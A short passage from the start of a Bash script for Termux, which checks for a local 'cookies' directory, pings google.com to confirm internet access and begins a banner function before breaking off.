#!/bin/bash
function breakme () {
if [ -d /data/data/com.termux/files/usr/cookies ]; then
echo ""
clear
else
clear
echo " cookies not found"
echo " please update"
exit
fi
ping -c 1 google.com
Return="$?"
if [ "$Return" -eq "0" ]; then
echo ""
clear
else
clear
echo ""
echo " Please On Your Mobile Data"
sleep 8
clear
fi
}
function banners () {
breakme
